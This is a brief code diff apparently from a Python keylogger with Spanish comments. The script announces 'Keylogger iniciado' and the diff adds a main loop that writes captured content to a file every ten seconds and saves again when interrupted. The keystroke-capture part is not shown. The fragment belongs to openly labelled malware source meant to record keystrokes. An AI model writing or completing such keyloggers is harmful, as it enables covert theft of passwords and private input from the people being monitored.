@@ -33,3 +33,10 @@ def guardar_en_archivo():
 # Bucle principal: guarda el contenido cada 10 segundos
 print("Keylogger iniciado... (Ctrl+C para salir)")
 
+try:
+    while True:
+        time.sleep(10)
+        guardar_en_archivo()
+except KeyboardInterrupt:
+    print("\nPrograma finalizado.")
+    guardar_en_archivo()
